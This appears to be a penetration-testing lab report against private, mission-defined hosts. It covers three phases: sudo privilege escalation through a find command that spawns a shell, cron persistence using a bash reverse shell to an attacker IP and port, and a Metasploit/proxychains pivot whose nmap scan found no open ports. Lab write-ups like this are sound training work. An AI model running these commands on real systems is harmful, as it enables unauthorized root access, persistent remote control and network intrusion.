# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/find
* **GTFOBins Exploit Command Used:** sudo find . -exec /bin/sh \; -quit

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.99/4444 0>&1'
* **Persistence Confirmed:** Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** post/multi/manage/autoroute && auxiliary/server/socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** During Phase 3, I successfully established a SOCKS5 pivot using SSH dynamic port forwarding and routed all traffic through proxychains. This allowed Nmap to scan the hidden vault network at 10.0.10.0/24 and specifically target the mission‑defined database host at 10.0.10.50. A full TCP port scan was executed using proxychains nmap -sT -Pn -p- -T4 10.0.10.50. The host responded immediately, confirming that the pivot was functioning correctly and that traffic was reaching the internal network. However, the scan results showed: Host is up; All 65,535 ports returned conn-refused; No open ports were detected. A conn-refused response indicates that the operating system is reachable and actively rejecting connections, but no services are listening on any port. This behavior is consistent with a backend service that is offline or misconfigured rather than a scanning or pivoting error. This means that Although the pivot into the hidden network was successful, the vault database service on 10.0.10.50 was not running at the time of assessment. As a result, no open port could be identified for the hidden database.

